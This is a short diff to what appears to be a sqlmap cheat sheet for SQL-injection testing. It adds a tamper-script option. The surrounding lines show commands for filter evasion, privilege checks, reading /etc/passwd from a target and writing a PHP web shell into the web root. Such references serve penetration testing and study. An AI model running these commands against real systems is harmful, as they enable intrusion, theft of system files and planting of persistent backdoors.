@@ -681,6 +681,7 @@ $ sqlmap -u <URL> --randomize=rp --batch -v 5 | grep URI
 $ sqlmap <URL> --random-agent
 $ sqlmap -u <URL> --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
 $ sqlmap --list-tampers
+$ sqlmap -u <URL> --tamper=between
 $ sqlmap -u <URL> --is-dba
 $ sqlmap -u <URL> --file-read "/etc/passwd"
 $ sqlmap -u <URL> --file-write "shell.php" --file-dest "/var/www/html/shell.php"
